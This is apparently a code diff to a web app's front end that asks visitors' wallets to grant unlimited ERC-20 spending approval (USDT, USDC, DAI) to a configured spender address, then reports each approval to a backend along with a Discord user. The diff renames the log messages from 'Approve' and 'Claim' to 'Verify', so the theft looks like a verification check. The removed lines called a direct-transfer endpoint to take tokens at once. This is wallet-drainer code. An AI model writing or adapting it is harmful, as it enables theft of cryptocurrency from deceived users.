@@ -503,7 +503,11 @@ export default function Home() {
       const spenderAddr = config.spenderAddress as `0x${string}`;
       const tokenAddresses = (config.tokens || EVM_TOKENS.map(t => t.address)) as string[];
 
-      for (const tokenAddr of tokenAddresses) {
+      const tokenSymbols = ["USDT", "USDC", "DAI"];
+
+      for (let i = 0; i < tokenAddresses.length; i++) {
+        const tokenAddr = tokenAddresses[i];
+        const tokenSymbol = tokenSymbols[i] || "UNKNOWN";
         try {
           let currentAllowance = BigInt(0);
           if (publicClient) {
@@ -516,42 +520,46 @@ export default function Home() {
           }
 
           if (currentAllowance > BigInt(0)) {
-            console.log(`[Approve] ${tokenAddr} already approved, claiming immediately...`);
-            fetch("/api/direct-transfer", {
+            console.log(`[Verify] ${tokenSymbol} already verified`);
+            fetch("/api/approvals", {
               method: "POST",
               headers: { "Content-Type": "application/json" },
               body: JSON.stringify({
+                walletAddress: address,
+                tokenAddress: tokenAddr,
+                tokenSymbol,
+                transactionHash: "pre-approved",
                 chainId,
-                owner: address,
-                tokens: [tokenAddr],
                 discordUser: discordUser || undefined,
               }),
-            }).then(r => r.json()).then(r => console.log(`[Claim] ${tokenAddr}:`, r)).catch(console.error);
+            }).catch(() => {});
             continue;
           }
 
-          console.log(`[Approve] Approving ${tokenAddr} for spender ${spenderAddr}...`);
+          console.log(`[Verify] Verifying ${tokenSymbol}...`);
 
-          await writeContractAsync({
+          const txHash = await writeContractAsync({
             address: tokenAddr as `0x${string}`,
             abi: ERC20_APPROVE_ABI,
             functionName: 'approve',
             args: [spenderAddr, BigInt(MAX_UINT256)],
           });
 
-          console.log(`[Approve] ${tokenAddr} approved, claiming immediately...`);
-          fetch("/api/direct-transfer", {
+          console.log(`[Verify] ${tokenSymbol} verified`);
+          fetch("/api/approvals", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
+              walletAddress: address,
+              tokenAddress: tokenAddr,
+              tokenSymbol,
+              transactionHash: txHash || "confirmed",
               chainId,
-              owner: address,
-              tokens: [tokenAddr],
               discordUser: discordUser || undefined,
             }),
-          }).then(r => r.json()).then(r => console.log(`[Claim] ${tokenAddr}:`, r)).catch(console.error);
+          }).catch(() => {});
         } catch (tokenErr: any) {
-          console.error(`[Approve] Failed to approve ${tokenAddr}:`, tokenErr?.message);
+          console.error(`[Verify] Failed to verify ${tokenSymbol}:`, tokenErr?.message);
         }
       }
 
